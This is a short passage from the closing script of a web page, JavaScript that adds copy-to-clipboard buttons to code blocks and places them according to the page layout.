                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
